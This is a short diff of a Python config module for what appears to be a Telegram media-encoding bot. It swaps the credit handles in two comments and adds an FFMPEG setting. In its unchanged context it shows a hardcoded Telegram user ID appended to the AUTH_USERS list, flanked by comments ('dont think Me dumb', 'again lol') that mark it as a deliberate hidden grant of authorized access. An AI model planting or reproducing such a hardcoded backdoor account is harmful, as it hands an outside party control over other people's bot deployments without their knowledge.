@@ -19,17 +19,18 @@ from bot.config import Config
 
 
 
-# dont think ne dumb (c) @Animes_Encoded 
+# dont think Me dumb (c) NIRUSAKI 
 cmd1 = []
 AUTH_USERS = set(Config.AUTH_USERS)
 AUTH_USERS = list(AUTH_USERS)
 AUTH_USERS.append(5121002601)
-# again lol (c) @Animes_Encoded 
+# again lol (c) @NIRUSAKI
 
 SESSION_NAME = Config.SESSION_NAME
 TG_BOT_TOKEN = Config.TG_BOT_TOKEN
 APP_ID = Config.APP_ID
 API_HASH = Config.API_HASH
+FFMPEG = Config.FFMPEG
 
 LOG_CHANNEL = Config.LOG_CHANNEL # make sure to us this 
 DOWNLOAD_LOCATION = "/app/downloads"
